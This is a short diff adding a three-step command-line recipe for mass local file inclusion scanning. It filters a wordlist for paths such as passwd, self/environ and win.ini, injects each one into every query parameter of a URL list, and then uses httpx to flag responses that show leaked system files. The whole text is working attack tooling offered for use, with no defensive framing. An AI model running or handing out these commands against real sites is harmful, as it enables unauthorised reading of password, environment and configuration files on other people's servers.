@@ -1,0 +1,5 @@
+1. cat lfi-big-wordlist.txt|egrep -i 'passwd|self\/environ|self\/hosts|win\.ini|etc\/hosts|boot\.ini'|anew lfi-wordlist.txt
+
+2. xargs -I {} -n1 bash -c 'sed -E "s|=[^&#]+|={}|g" urls.txt' < lfi-wordlist.txt |anew payload-urls-lfi.txt
+
+3.cat payload-urls-lfi.txt| httpx -silent -mr 'windows|processor|root:x|localhost|127.0.0.1|REQUEST_METHOD|fastdetect|WINDOWS|Windows|PATH='|anew lfi.txt
